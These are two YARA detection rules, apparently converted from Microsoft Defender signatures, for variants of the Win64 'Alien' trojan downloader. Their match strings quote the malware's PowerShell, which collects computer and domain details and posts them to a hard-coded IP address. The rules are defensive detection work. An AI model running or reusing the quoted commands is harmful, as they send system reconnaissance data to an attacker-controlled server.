rule TrojanDownloader_Win64_Alien_MK_2147982917_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win64/Alien.MK!MTB"
        threat_id = "2147982917"
        type = "TrojanDownloader"
        platform = "Win64: Windows 64-bit platform"
        family = "Alien"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "$x=$i+$s+$c.Name+$s+$c.Domain+$s+$c.PartOfDomain+$s+$c.DomainRole" ascii //weight: 5
        $x_3_2 = "irm -Method Post -ContentType \"text/plain\" -Body $x -Uri http://209.99.186.174:8999/role" ascii //weight: 3
        $x_2_3 = "$c=gcim Win32_ComputerSystem" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win64_Alien_MKA_2147982978_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win64/Alien.MKA!MTB"
        threat_id = "2147982978"
        type = "TrojanDownloader"
        platform = "Win64: Windows 64-bit platform"
        family = "Alien"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "irm -Method Post -Body $x -Uri http://209.99.186.17" ascii //weight: 5
        $x_3_2 = "$x=$i+$s+$c.Name+$s+$c.Domain+$s+$c.PartOfDomain+$s+$c.DomainRole;" ascii //weight: 3
        $x_2_3 = "$s=[char]59;$c=gcim Win32_ComputerSystem;" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

